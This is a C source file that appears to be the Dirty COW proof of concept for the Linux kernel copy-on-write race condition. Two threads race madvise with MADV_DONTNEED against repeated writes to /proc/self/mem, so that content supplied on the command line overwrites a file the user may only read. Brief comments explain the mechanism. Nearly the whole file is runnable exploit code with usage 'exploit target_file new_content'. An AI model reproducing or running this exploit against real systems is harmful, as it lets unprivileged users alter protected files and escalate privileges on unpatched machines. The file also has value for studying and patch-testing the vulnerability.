#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>

void *map; //Memory Mapping
int f; //file descriptor for target file
struct stat st; //file information
char *name; //name of target file

/*
On this thread, we use madvise, which is an optimization
call for handling memory. We call madvise with the DONTNEED flag,
which causes subsequent accesses to the specified memory range be
reloaded each time they are accessed
*/
void *madviseThread(void *arg){
	char *str;
	str=(char*)arg;
	int i,c=0;
	for(i = 0; i < 1000000; i++){
		c += madvise(map, 100, MADV_DONTNEED);
	}
	printf("madvise %d\n\n", c);
}

/*
This thread opens the proc/self/mem file, which contains the
memory for the current process. We seek the beginning of this
file, and then write the passed string to it. The kernel should
make a copy of the file and then write to that (COW), although
when the race condition with madvise is introduced, the underlying
file will be written to, rather than a copy. 
*/

void *procselfmemThread(void *arg){
	char *str;
	str=(char*)arg;
	int f = open("/proc/self/mem", O_RDWR);
	int i,c = 0;
	for(i = 0; i < 1000000; i++){
		lseek(f,(uintptr_t) map, SEEK_SET);
		c += write(f,str,strlen(str));
	}
	printf("procselfmem %d \n\n", c);
}


int main(int argc, char *argv[]){
	if(argc < 3){
		(void)fprintf(stderr," %s\n", "usage: exploit target_file new_content");
		return 1;
	}
	pthread_t pth1, pth2;
	f = open(argv[1], O_RDONLY); //open target file as read only
	fstat(f, &st);
	name = argv[1];
	//open with MAP_PRIVATE to enable COW mapping
	map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE,f,0); 
	printf("mmap %zx\n\n", (uintptr_t) map);

	pthread_create(&pth1, NULL, madviseThread, argv[1]);
	pthread_create(&pth2, NULL, procselfmemThread, argv[2]);

	pthread_join(pth1, NULL);
	pthread_join(pth2, NULL);
	return 0;
}
